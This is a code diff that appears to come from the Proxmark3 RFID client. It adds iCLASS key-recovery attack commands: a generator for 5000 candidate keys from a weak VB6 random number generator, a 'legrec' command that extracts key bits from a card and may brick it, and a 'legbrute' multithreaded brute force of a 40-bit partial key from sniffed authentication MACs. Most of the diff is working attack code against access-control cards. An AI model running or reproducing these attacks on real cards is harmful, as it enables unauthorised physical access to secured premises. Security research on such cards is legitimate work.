@@ -39,6 +39,7 @@
 #include "iclass_cmd.h"
 #include "crypto/asn1utils.h"       // ASN1 decoder
 #include "preferences.h"
+#include "generator.h"
 
 
 #define NUM_CSNS               9
@@ -1448,6 +1449,7 @@ static int CmdHFiClassDecrypt(const char *Cmd) {
         arg_lit0("v", "verbose", "verbose output"),
         arg_lit0(NULL, "d6", "decode as block 6"),
         arg_lit0("z", "dense", "dense dump output style"),
+        arg_lit0(NULL, "ns", "no save to file"),        
         arg_param_end
     };
     CLIExecWithReturn(clictx, Cmd, argtable, false);
@@ -1472,6 +1474,7 @@ static int CmdHFiClassDecrypt(const char *Cmd) {
     bool verbose = arg_get_lit(clictx, 4);
     bool use_decode6 = arg_get_lit(clictx, 5);
     bool dense_output = g_session.dense_output || arg_get_lit(clictx, 6);
+    bool nosave = arg_get_lit(clictx, 7);
     CLIParserFree(clictx);
 
     // sanity checks
@@ -1611,6 +1614,11 @@ static int CmdHFiClassDecrypt(const char *Cmd) {
             }
         }
 
+        if (nosave) {
+            PrintAndLogEx(INFO, "Called with no save option");
+            PrintAndLogEx(NORMAL, "");
+        } else {
+
         // use the first block (CSN) for filename
         char *fptr = calloc(50, sizeof(uint8_t));
         if (fptr == false) {
@@ -1623,6 +1631,8 @@ static int CmdHFiClassDecrypt(const char *Cmd) {
         FillFileNameByUID(fptr, hdr->csn, "-dump-decrypted", sizeof(hdr->csn));
 
         pm3_save_dump(fptr, decrypted, decryptedlen, jsfIclass);
+            free(fptr);
+        }
 
         printIclassDumpContents(decrypted, 1, (decryptedlen / 8), decryptedlen, dense_output);
 
@@ -1634,11 +1644,9 @@ static int CmdHFiClassDecrypt(const char *Cmd) {
 
         // decode block 6
         bool has_values = (memcmp(decrypted + (8 * 6), empty, 8) != 0) && (memcmp(decrypted + (8 * 6), zeros, 8) != 0);
-        if (has_values) {
-            if (use_sc) {
+        if (has_values && use_sc) {
                 DecodeBlock6(decrypted + (8 * 6));
             }
-        }
 
         // decode block 7-8-9
         iclass_decode_credentials(decrypted);
@@ -1664,7 +1672,6 @@ static int CmdHFiClassDecrypt(const char *Cmd) {
 
         PrintAndLogEx(INFO, "-----------------------------------------------------------------");
         free(decrypted);
-        free(fptr);
     }
 
     mbedtls_des3_free(&ctx);
@@ -3581,26 +3588,33 @@ static int CmdHFiClassCheckKeys(const char *Cmd) {
     CLIParserInit(&ctx, "hf iclass chk",
                   "Checkkeys loads a dictionary text file with 8byte hex keys to test authenticating against a iClass tag",
                   "hf iclass chk -f iclass_default_keys.dic\n"
-                  "hf iclass chk -f iclass_elite_keys.dic --elite");
+                  "hf iclass chk -f iclass_elite_keys.dic --elite\n"
+                  "hf iclass chk --vb6kdf\n");
 
     void *argtable[] = {
         arg_param_begin,
-        arg_str1("f", "file", "<fn>", "Dictionary file with default iclass keys"),
+        arg_str0("f", "file", "<fn>", "Dictionary file with default iclass keys"),
         arg_lit0(NULL, "credit", "key is assumed to be the credit key"),
         arg_lit0(NULL, "elite", "elite computations applied to key"),
         arg_lit0(NULL, "raw", "no computations applied to key (raw)"),
         arg_lit0(NULL, "shallow", "use shallow (ASK) reader modulation instead of OOK"),
+        arg_lit0(NULL, "vb6kdf", "use the VB6 elite KDF instead of a file"),
         arg_param_end
     };
     CLIExecWithReturn(ctx, Cmd, argtable, false);
 
     int fnlen = 0;
     char filename[FILE_PATH_SIZE] = {0};
-    CLIParamStrToBuf(arg_get_str(ctx, 1), (uint8_t *)filename, FILE_PATH_SIZE, &fnlen);
-
-    bool use_credit_key = arg_get_lit(ctx, 2);
+    bool use_vb6kdf = arg_get_lit(ctx, 6);
     bool use_elite = arg_get_lit(ctx, 3);
     bool use_raw = arg_get_lit(ctx, 4);
+    if (use_vb6kdf) {
+        use_elite = true;
+    } else {
+        CLIParamStrToBuf(arg_get_str(ctx, 1), (uint8_t *)filename, FILE_PATH_SIZE, &fnlen);
+    }
+
+    bool use_credit_key = arg_get_lit(ctx, 2);
     bool shallow_mod = arg_get_lit(ctx, 5);
 
     CLIParserFree(ctx);
@@ -3613,10 +3627,26 @@ static int CmdHFiClassCheckKeys(const char *Cmd) {
     // load keys
     uint8_t *keyBlock = NULL;
     uint32_t keycount = 0;
-    int res = loadFileDICTIONARY_safe(filename, (void **)&keyBlock, 8, &keycount);
-    if (res != PM3_SUCCESS || keycount == 0) {
-        free(keyBlock);
-        return res;
+
+    if (!use_vb6kdf) {
+        // Load keys
+        int res = loadFileDICTIONARY_safe(filename, (void **)&keyBlock, 8, &keycount);
+        if (res != PM3_SUCCESS || keycount == 0) {
+            free(keyBlock);
+            return res;
+        }
+    } else {
+        // Generate 5000 keys using VB6 KDF
+        keycount = 5000;
+        keyBlock = malloc(keycount * 8);
+        if (!keyBlock) {
+            return PM3_EMALLOC;
+        }
+
+        picopass_elite_reset();
+        for (uint32_t i = 0; i < keycount; i++) {
+            picopass_elite_nextKey(keyBlock + (i * 8));
+        }
     }
 
     // limit size of keys that can be held in memory
@@ -3774,29 +3804,362 @@ out:
 
 // this method tries to identify in which configuration mode a iCLASS / iCLASS SE reader is in.
 // Standard or Elite / HighSecurity mode.  It uses a default key dictionary list in order to work.
+#define INITIAL_SEED 0x429080 // VB6 KDF Seed Value
+
+// Functions for generating keys using RNG
+uint32_t seed = INITIAL_SEED;
+uint8_t key_state[8];
+bool prepared = false;
+
+void picopass_elite_reset(void) {
+    memset(key_state, 0, sizeof(key_state));
+    seed = INITIAL_SEED;
+    prepared = false;
+}
+
+uint32_t picopass_elite_lcg(void) {
+    uint32_t mod = 0x1000000; // 2^24
+    uint32_t a = 0xFD43FD;
+    uint32_t c = 0xC39EC3;
+
+    return (a * seed + c) % mod;
+}
+
+uint32_t picopass_elite_rng(void) {
+    seed = picopass_elite_lcg();
+    return seed;
+}
+
+uint8_t picopass_elite_nextByte(void) {
+    return (picopass_elite_rng() >> 16) & 0xFF;
+}
+
+void picopass_elite_nextKey(uint8_t *key) {
+    if (prepared) {
+        for (size_t i = 0; i < 7; i++) {
+            key_state[i] = key_state[i + 1];
+        }
+        key_state[7] = picopass_elite_nextByte();
+    } else {
+        for (size_t i = 0; i < 8; i++) {
+            key_state[i] = picopass_elite_nextByte();
+        }
+        prepared = true;
+    }
+    memcpy(key, key_state, 8);
+}
+
+static int CmdHFiClassRecover(uint8_t key[8]) {
+
+    uint32_t payload_size = sizeof(iclass_recover_req_t);
+    uint8_t aa2_standard_key[PICOPASS_BLOCK_SIZE] = {0};
+    memcpy(aa2_standard_key, iClass_Key_Table[1], PICOPASS_BLOCK_SIZE);
+    iclass_recover_req_t *payload = calloc(1, payload_size);
+    payload->req.use_raw = true;
+    payload->req.use_elite = false;
+    payload->req.use_credit_key = false;
+    payload->req.use_replay = true;
+    payload->req.send_reply = true;
+    payload->req.do_auth = true;
+    payload->req.shallow_mod = false;
+    payload->req2.use_raw = false;
+    payload->req2.use_elite = false;
+    payload->req2.use_credit_key = true;
+    payload->req2.use_replay = false;
+    payload->req2.send_reply = true;
+    payload->req2.do_auth = true;
+    payload->req2.shallow_mod = false;
+    memcpy(payload->req.key, key, 8);
+    memcpy(payload->req2.key, aa2_standard_key, 8);
+
+    PrintAndLogEx(INFO, "Recover started...");
+
+    PacketResponseNG resp;
+    clearCommandBuffer();
+    SendCommandNG(CMD_HF_ICLASS_RECOVER, (uint8_t *)payload, payload_size);
+
+    WaitForResponse(CMD_HF_ICLASS_RECOVER, &resp);
+
+    if (resp.status == PM3_SUCCESS) {
+        PrintAndLogEx(SUCCESS, "iCLASS Key Bits Recovery " _GREEN_("successful"));
+    } else {
+        PrintAndLogEx(WARNING, "iCLASS Key Bits Recovery " _RED_("failed"));
+    }
+
+    free(payload);
+    return resp.status;
+}
+
+typedef struct {
+    uint32_t start_index;
+    uint32_t keycount;
+    const uint8_t *startingKey;
+    uint8_t (*keyBlock)[PICOPASS_BLOCK_SIZE];
+} ThreadData;
+
+void *generate_key_blocks(void *arg) {
+    ThreadData *data = (ThreadData *)arg;
+    uint32_t start_index = data->start_index;
+    uint32_t keycount = data->keycount;
+    const uint8_t *startingKey = data->startingKey;
+    uint8_t (*keyBlock)[PICOPASS_BLOCK_SIZE] = data->keyBlock;
+
+    for (uint32_t i = 0; i < keycount; i++) {
+        uint32_t carry = start_index + i;
+        memcpy(keyBlock[i], startingKey, PICOPASS_BLOCK_SIZE);
+
+        for (int j = PICOPASS_BLOCK_SIZE - 1; j >= 0; j--) {
+            uint8_t increment_value = (carry & 0x1F) << 3;  // Use only the first 5 bits of carry
+            keyBlock[i][j] = (keyBlock[i][j] & 0x07) | increment_value;  // Preserve the last three bits
+
+            carry >>= 5;  // Shift right by 5 bits for the next byte
+            if (carry == 0) {
+                // If no more carry, break early to avoid unnecessary loops
+                break;
+            }
+        }
+    }
+
+    return NULL;
+}
+
+static int CmdHFiClassLegRecLookUp(const char *Cmd) {
+
+    //Standalone Command Start
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "hf iclass legbrute",
+                  "This command take sniffed trace data and partial raw key and bruteforces the remaining 40 bits of the raw key.",
+                  "hf iclass legbrute --csn 8D7BD711FEFF12E0 --epurse feffffffffffffff --macs 00000000BD478F76 --pk B4F12AADC5301225"
+                 );
+
+    void *argtable[] = {
+        arg_param_begin,
+        arg_str1(NULL, "csn", "<hex>", "Specify CSN as 8 hex bytes"),
+        arg_str1(NULL, "epurse", "<hex>", "Specify ePurse as 8 hex bytes"),
+        arg_str1(NULL, "macs", "<hex>", "MACs"),
+        arg_str1(NULL, "pk", "<hex>", "Partial Key"),
+        arg_param_end
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, false);
+
+    int csn_len = 0;
+    uint8_t csn[8] = {0};
+    CLIGetHexWithReturn(ctx, 1, csn, &csn_len);
+
+    if (csn_len > 0) {
+        if (csn_len != 8) {
+            PrintAndLogEx(ERR, "CSN is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    int epurse_len = 0;
+    uint8_t epurse[8] = {0};
+    CLIGetHexWithReturn(ctx, 2, epurse, &epurse_len);
+
+    if (epurse_len > 0) {
+        if (epurse_len != 8) {
+            PrintAndLogEx(ERR, "ePurse is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    int macs_len = 0;
+    uint8_t macs[8] = {0};
+    CLIGetHexWithReturn(ctx, 3, macs, &macs_len);
+
+    if (macs_len > 0) {
+        if (macs_len != 8) {
+            PrintAndLogEx(ERR, "MAC is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    int startingkey_len = 0;
+    uint8_t startingKey[8] = {0};
+    CLIGetHexWithReturn(ctx, 4, startingKey, &startingkey_len);
+
+    if (startingkey_len > 0) {
+        if (startingkey_len != 8) {
+            PrintAndLogEx(ERR, "Partial Key is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    CLIParserFree(ctx);
+    //Standalone Command End
+
+    uint8_t CCNR[12];
+    uint8_t MAC_TAG[4] = {0, 0, 0, 0};
+
+    // Copy CCNR and MAC_TAG
+    memcpy(CCNR, epurse, 8);
+    memcpy(CCNR + 8, macs, 4);
+    memcpy(MAC_TAG, macs + 4, 4);
+
+    PrintAndLogEx(SUCCESS, "    CSN: " _GREEN_("%s"), sprint_hex(csn, 8));
+    PrintAndLogEx(SUCCESS, " Epurse: %s", sprint_hex(epurse, 8));
+    PrintAndLogEx(SUCCESS, "   MACS: %s", sprint_hex(macs, 8));
+    PrintAndLogEx(SUCCESS, "   CCNR: " _GREEN_("%s"), sprint_hex(CCNR, sizeof(CCNR)));
+    PrintAndLogEx(SUCCESS, "TAG MAC: %s", sprint_hex(MAC_TAG, sizeof(MAC_TAG)));
+    PrintAndLogEx(SUCCESS, "Starting Key: %s", sprint_hex(startingKey, 8));
+
+    uint32_t keycount = 1000000;
+    uint32_t keys_per_thread = 200000;
+    uint32_t num_threads = keycount / keys_per_thread;
+    pthread_t threads[num_threads];
+    ThreadData thread_data[num_threads];
+    iclass_prekey_t *prekey = NULL;
+    iclass_prekey_t lookup;
+    iclass_prekey_t *item = NULL;
+
+    memcpy(lookup.mac, MAC_TAG, 4);
+
+    uint32_t block_index = 0;
+
+    while (item == NULL) {
+        for (uint32_t t = 0; t < num_threads; t++) {
+            thread_data[t].start_index = block_index * keycount + t * keys_per_thread;
+            thread_data[t].keycount = keys_per_thread;
+            thread_data[t].startingKey = startingKey;
+            thread_data[t].keyBlock = calloc(keys_per_thread, PICOPASS_BLOCK_SIZE);
+
+            if (thread_data[t].keyBlock == NULL) {
+                PrintAndLogEx(ERR, "Memory allocation failed for keyBlock in thread %d.", t);
+                for (uint32_t i = 0; i < t; i++) {
+                    free(thread_data[i].keyBlock);
+                }
+                return PM3_EINVARG;
+            }
+
+            pthread_create(&threads[t], NULL, generate_key_blocks, (void *)&thread_data[t]);
+        }
+
+        for (uint32_t t = 0; t < num_threads; t++) {
+            pthread_join(threads[t], NULL);
+        }
+
+        if (prekey == NULL) {
+            prekey = calloc(keycount, sizeof(iclass_prekey_t));
+        } else {
+            prekey = realloc(prekey, (block_index + 1) * keycount * sizeof(iclass_prekey_t));
+        }
+
+        if (prekey == NULL) {
+            PrintAndLogEx(ERR, "Memory allocation failed for prekey.");
+            for (uint32_t t = 0; t < num_threads; t++) {
+                free(thread_data[t].keyBlock);
+            }
+            return PM3_EINVARG;
+        }
+
+        PrintAndLogEx(INFO, "Generating diversified keys...");
+        for (uint32_t t = 0; t < num_threads; t++) {
+            GenerateMacKeyFrom(csn, CCNR, true, false, (uint8_t *)thread_data[t].keyBlock, keys_per_thread, prekey + (block_index * keycount) + (t * keys_per_thread));
+        }
+
+        PrintAndLogEx(INFO, "Sorting...");
+
+        // Sort mac list
+        qsort(prekey, (block_index + 1) * keycount, sizeof(iclass_prekey_t), cmp_uint32);
+
+        PrintAndLogEx(SUCCESS, "Searching for " _YELLOW_("%s") " key...", "DEBIT");
+
+        // Binary search
+        item = (iclass_prekey_t *)bsearch(&lookup, prekey, (block_index + 1) * keycount, sizeof(iclass_prekey_t), cmp_uint32);
+
+        for (uint32_t t = 0; t < num_threads; t++) {
+            free(thread_data[t].keyBlock);
+        }
+
+        block_index++;
+    }
+
+    if (item != NULL) {
+        PrintAndLogEx(SUCCESS, "Found valid RAW key " _GREEN_("%s"), sprint_hex(item->key, 8));
+    }
+
+    free(prekey);
+    PrintAndLogEx(NORMAL, "");
+    return PM3_SUCCESS;
+}
+
+
+static int CmdHFiClassLegacyRecover(const char *Cmd) {
+
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "hf iclass legrec",
+                  "Attempts to recover the diversified key of a specific iClass card. This may take a long time. The Card must remain be on the PM3 antenna during the whole process! This process may brick the card!",
+                  "hf iclass legrec --macs 0000000089cb984b"
+                 );
+
+    void *argtable[] = {
+        arg_param_begin,
+        arg_str1(NULL, "macs", "<hex>", "MACs"),
+        arg_param_end
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, false);
+
+    int macs_len = 0;
+    uint8_t macs[8] = {0};
+    CLIGetHexWithReturn(ctx, 1, macs, &macs_len);
+
+    if (macs_len > 0) {
+        if (macs_len != 8) {
+            PrintAndLogEx(ERR, "MAC is incorrect length");
+            CLIParserFree(ctx);
+            return PM3_EINVARG;
+        }
+    }
+
+    CLIParserFree(ctx);
+
+    CmdHFiClassRecover(macs);
+
+    PrintAndLogEx(WARNING, _YELLOW_("If the process completed, you can now run 'hf iclass legrecbrute' with the partial key found."));
+
+    PrintAndLogEx(NORMAL, "");
+    return PM3_SUCCESS;
+
+}
+
 static int CmdHFiClassLookUp(const char *Cmd) {
     CLIParserContext *ctx;
     CLIParserInit(&ctx, "hf iclass lookup",
                   "This command take sniffed trace data and try to recovery a iCLASS Standard or iCLASS Elite key.",
                   "hf iclass lookup --csn 9655a400f8ff12e0 --epurse f0ffffffffffffff --macs 0000000089cb984b -f iclass_default_keys.dic\n"
-                  "hf iclass lookup --csn 9655a400f8ff12e0 --epurse f0ffffffffffffff --macs 0000000089cb984b -f iclass_default_keys.dic --elite"
+                  "hf iclass lookup --csn 9655a400f8ff12e0 --epurse f0ffffffffffffff --macs 0000000089cb984b -f iclass_default_keys.dic --elite\n"
+                  "hf iclass lookup --csn 9655a400f8ff12e0 --epurse f0ffffffffffffff --macs 0000000089cb984b --vb6rng"
                  );
 
     void *argtable[] = {
         arg_param_begin,
-        arg_str1("f", "file", "<fn>", "Dictionary file with default iclass keys"),
+        arg_str0("f", "file", "<fn>", "Dictionary file with default iclass keys"),
         arg_str1(NULL, "csn", "<hex>", "Specify CSN as 8 hex bytes"),
         arg_str1(NULL, "epurse", "<hex>", "Specify ePurse as 8 hex bytes"),
         arg_str1(NULL, "macs", "<hex>", "MACs"),
         arg_lit0(NULL, "elite", "Elite computations applied to key"),
         arg_lit0(NULL, "raw", "no computations applied to key"),
+        arg_lit0(NULL, "vb6rng", "use the VB6 rng for elite keys instead of a dictionary file"),
         arg_param_end
     };
     CLIExecWithReturn(ctx, Cmd, argtable, false);
 
+    bool use_vb6kdf = arg_get_lit(ctx, 7);
     int fnlen = 0;
     char filename[FILE_PATH_SIZE] = {0};
-    CLIParamStrToBuf(arg_get_str(ctx, 1), (uint8_t *)filename, FILE_PATH_SIZE, &fnlen);
+
+    bool use_elite = arg_get_lit(ctx, 5);
+    bool use_raw = arg_get_lit(ctx, 6);
+    if (use_vb6kdf) {
+        use_elite = true;
+    } else {
+        CLIParamStrToBuf(arg_get_str(ctx, 1), (uint8_t *)filename, FILE_PATH_SIZE, &fnlen);
+    }
 
     int csn_len = 0;
     uint8_t csn[8] = {0};
@@ -3834,15 +4197,12 @@ static int CmdHFiClassLookUp(const char *Cmd) {
         }
     }
 
-    bool use_elite = arg_get_lit(ctx, 5);
-    bool use_raw = arg_get_lit(ctx, 6);
-
     CLIParserFree(ctx);
 
     uint8_t CCNR[12];
     uint8_t MAC_TAG[4] = { 0, 0, 0, 0 };
 
-    // stupid copy.. CCNR is a combo of epurse and reader nonce
+    // Stupid copy.. CCNR is a combo of epurse and reader nonce
     memcpy(CCNR, epurse, 8);
     memcpy(CCNR + 8, macs, 4);
     memcpy(MAC_TAG, macs + 4, 4);
@@ -3853,20 +4213,34 @@ static int CmdHFiClassLookUp(const char *Cmd) {
     PrintAndLogEx(SUCCESS, "   CCNR: " _GREEN_("%s"), sprint_hex(CCNR, sizeof(CCNR)));
     PrintAndLogEx(SUCCESS, "TAG MAC: %s", sprint_hex(MAC_TAG, sizeof(MAC_TAG)));
 
-    // run time
+    // Run time
     uint64_t t1 = msclock();
 
     uint8_t *keyBlock = NULL;
     uint32_t keycount = 0;
 
-    // load keys
-    int res = loadFileDICTIONARY_safe(filename, (void **)&keyBlock, 8, &keycount);
-    if (res != PM3_SUCCESS || keycount == 0) {
-        free(keyBlock);
-        return res;
+    if (!use_vb6kdf) {
+        // Load keys
+        int res = loadFileDICTIONARY_safe(filename, (void **)&keyBlock, 8, &keycount);
+        if (res != PM3_SUCCESS || keycount == 0) {
+            free(keyBlock);
+            return res;
+        }
+    } else {
+        // Generate 5000 keys using VB6 KDF
+        keycount = 5000;
+        keyBlock = malloc(keycount * 8);
+        if (!keyBlock) {
+            return PM3_EMALLOC;
+        }
+
+        picopass_elite_reset();
+        for (uint32_t i = 0; i < keycount; i++) {
+            picopass_elite_nextKey(keyBlock + (i * 8));
+        }
     }
 
-    //iclass_prekey_t
+    // Iclass_prekey_t
     iclass_prekey_t *prekey = calloc(keycount, sizeof(iclass_prekey_t));
     if (!prekey) {
         free(keyBlock);
@@ -3883,7 +4257,7 @@ static int CmdHFiClassLookUp(const char *Cmd) {
 
     PrintAndLogEx(INFO, "Sorting...");
 
-    // sort mac list.
+    // Sort mac list
     qsort(prekey, keycount, sizeof(iclass_prekey_t), cmp_uint32);
 
     PrintAndLogEx(SUCCESS, "Searching for " _YELLOW_("%s") " key...", "DEBIT");
@@ -3891,7 +4265,7 @@ static int CmdHFiClassLookUp(const char *Cmd) {
     iclass_prekey_t lookup;
     memcpy(lookup.mac, MAC_TAG, 4);
 
-    // binsearch
+    // Binsearch
     item = (iclass_prekey_t *) bsearch(&lookup, prekey, keycount, sizeof(iclass_prekey_t), cmp_uint32);
 
     if (item != NULL) {
@@ -3900,7 +4274,7 @@ static int CmdHFiClassLookUp(const char *Cmd) {
     }
 
     t1 = msclock() - t1;
-    PrintAndLogEx(SUCCESS, "time in iclass lookup " _YELLOW_("%.3f") " seconds", (float)t1 / 1000.0);
+    PrintAndLogEx(SUCCESS, "Time in iclass lookup " _YELLOW_("%.3f") " seconds", (float)t1 / 1000.0);
 
     free(prekey);
     free(keyBlock);
@@ -4649,6 +5023,8 @@ static command_t CommandTable[] = {
     {"chk",         CmdHFiClassCheckKeys,       IfPm3Iclass,     "Check keys"},
     {"loclass",     CmdHFiClass_loclass,        AlwaysAvailable, "Use loclass to perform bruteforce reader attack"},
     {"lookup",      CmdHFiClassLookUp,          AlwaysAvailable, "Uses authentication trace to check for key in dictionary file"},
+    {"legrec",      CmdHFiClassLegacyRecover,   IfPm3Iclass,     "Attempts to recover the standard key of a legacy card"},
+    {"legbrute",    CmdHFiClassLegRecLookUp,    AlwaysAvailable, "Bruteforces 40 bits of a partial raw key"},
     {"-----------", CmdHelp,                    IfPm3Iclass,     "-------------------- " _CYAN_("Simulation") " -------------------"},
     {"sim",         CmdHFiClassSim,             IfPm3Iclass,     "Simulate iCLASS tag"},
     {"eload",       CmdHFiClassELoad,           IfPm3Iclass,     "Upload file into emulator memory"},
